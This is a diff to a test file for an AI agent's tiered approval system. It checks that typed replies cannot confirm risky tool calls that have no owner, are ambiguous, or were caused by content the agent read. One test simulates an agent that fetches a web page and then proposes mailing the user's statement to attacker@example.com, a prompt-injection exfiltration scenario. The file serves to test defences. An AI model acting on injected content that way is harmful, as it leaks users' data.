@@ -24,14 +24,15 @@ class _Fake(GenericFakeChatModel):
         return self
 
 
-@tool("send_email")
+@tool("gmail_delete_email")
 def send_email(to: str, body: str) -> str:
-    """Send an email (no rule names it: Tier 3 by default)."""
+    """Stands in for any Tier 3 call: the shipped rules name gmail_delete_email
+    at Tier 3 (an unruled tool is refused outright since 007)."""
     SENT.append({"to": to, "body": body})
     return f"sent to {to}"
 
 
-PROPOSE = AIMessage(content="", tool_calls=[{"name": "send_email", "args": {"to": "bank@example.com", "body": "statement"}, "id": "c1"}])
+PROPOSE = AIMessage(content="", tool_calls=[{"name": "gmail_delete_email", "args": {"to": "bank@example.com", "body": "statement"}, "id": "c1"}])
 
 
 @pytest.fixture
@@ -104,7 +105,7 @@ def test_a_legacy_plan_without_an_owner_is_not_answerable_by_typing(sec, agent_t
     legacy = _store().save(
         PendingAction(
             plan_text="Send the statement",
-            tool_name="send_email",
+            tool_name="gmail_delete_email",
             arguments={"to": "x@example.com", "body": "y"},
             targets=["x@example.com"],
             tier_at_statement=Tier.TIER_3,
@@ -159,8 +160,8 @@ def test_two_waiting_plans_and_a_bare_yes_approve_nothing_and_ask_which(sec, age
     two = AIMessage(
         content="",
         tool_calls=[
-            {"name": "send_email", "args": {"to": "one@example.com", "body": "1"}, "id": "c1"},
-            {"name": "send_email", "args": {"to": "two@example.com", "body": "2"}, "id": "c2"},
+            {"name": "gmail_delete_email", "args": {"to": "one@example.com", "body": "1"}, "id": "c1"},
+            {"name": "gmail_delete_email", "args": {"to": "two@example.com", "body": "2"}, "id": "c2"},
         ],
     )
     agent_turns.append([two])
@@ -186,7 +187,7 @@ def test_a_content_caused_plan_is_not_confirmed_by_typing(sec, agent_turns, monk
     agent_turns.append(
         [
             AIMessage(content="", tool_calls=[{"name": "web_fetch", "args": {"url": "https://example.com"}, "id": "r1"}]),
-            AIMessage(content="", tool_calls=[{"name": "send_email", "args": {"to": "attacker@example.com", "body": "statement"}, "id": "s1"}]),
+            AIMessage(content="", tool_calls=[{"name": "gmail_delete_email", "args": {"to": "attacker@example.com", "body": "statement"}, "id": "s1"}]),
         ]
     )
     _say(sec.owner, a, "summarise that page")
